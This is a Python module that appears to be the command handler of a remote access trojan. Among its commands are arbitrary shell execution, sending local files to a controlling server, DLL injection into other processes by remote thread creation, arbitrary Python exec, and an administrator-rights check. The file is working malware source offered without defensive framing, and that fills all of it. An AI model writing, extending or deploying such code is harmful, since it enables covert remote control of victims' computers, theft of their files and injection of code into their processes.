import contextlib
import inspect
import io
import locale
import os
import subprocess
from functools import wraps

from util.common_util import parse_args

if os.name == 'nt':
    from util.win32util import *


def desc(text: str):
    """
    为被添加注解的函数设置命令帮助
    """

    def attr_decorator(func):
        setattr(func, 'help', text)
        return func

    return attr_decorator


def params(arg_list: list):
    """
    为被添加注解的函数设置属性
    """

    def attr_decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            # 解析函数参数获得参数字典
            arg_dict = parse_args(arg_list, args[0])
            # 遍历参数字典
            for key in arg_dict:
                # 为函数设置属性
                setattr(func, key, arg_dict[key])
            # 将对函数自身的引用添加到函数的第一个参数
            return func(func, *args, **kwargs)

        # 保留函数原始参数
        wrapper.__signature__ = inspect.signature(func)
        return wrapper

    return attr_decorator


def require_admin(func):
    """
    被添加注解的函数执行前需要检查管理员权限
    """

    def check_admin(*args):
        if ctypes.windll.shell32.IsUserAnAdmin():
            return func(*args)
        else:
            return 0, 'Operation requires elevation'

    return check_admin


class Command:

    @staticmethod
    @desc('show this help')
    def help():
        """
        显示帮助菜单
        """
        method_list = [method for method in dir(Command) if not method.startswith('__')]
        commands = {}
        for method_name in method_list:
            method = getattr(Command, method_name)
            if hasattr(method, 'help'):
                commands[method_name] = method.help
            else:
                commands[method_name] = None
        return 1, '\n'.join(f'{key:12}{value}' for key, value in commands.items())

    @staticmethod
    @desc('change directory')
    def cd(path):
        """
        切换目录
        """
        if not path:
            return 1, ''
        if os.path.isdir(path):
            os.chdir(path)
            return 1, ''
        else:
            return 0, 'Cannot find the path specified'

    @staticmethod
    @desc('execute shell command')
    def shell(command):
        """
        执行shell命令
        """
        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.DEVNULL)
        stdout = str(cmd.stdout.read(), locale.getdefaultlocale()[1])
        stderr = str(cmd.stderr.read(), locale.getdefaultlocale()[1])
        if stdout:
            return 1, stdout
        elif stderr:
            return 0, stderr
        else:
            return 1, ''

    @staticmethod
    @desc('download file')
    def download(server, filename):
        """
        给服务端发送文件
        """
        if os.path.isfile(filename):
            server.send_file(filename)
        else:
            server.send_result(0, 'File does not exist')

    @staticmethod
    @desc('inject DLL into process')
    @params(['pid', 'dll_path'])
    def inject(this, args):
        """
        远程线程注入
        """
        if not os.path.isfile(this.dll_path):
            return 0, 'File does not exist: {}'.format(this.dll_path)
        return create_remote_thread(int(this.pid), os.path.abspath(this.dll_path))

    @staticmethod
    @desc('execute python code')
    def pyexec(code, args: dict = None):
        """
        执行Python代码
        """
        f = io.StringIO()
        with contextlib.redirect_stdout(f), contextlib.redirect_stderr(f):
            exec(code, args)
        return 1, f.getvalue()
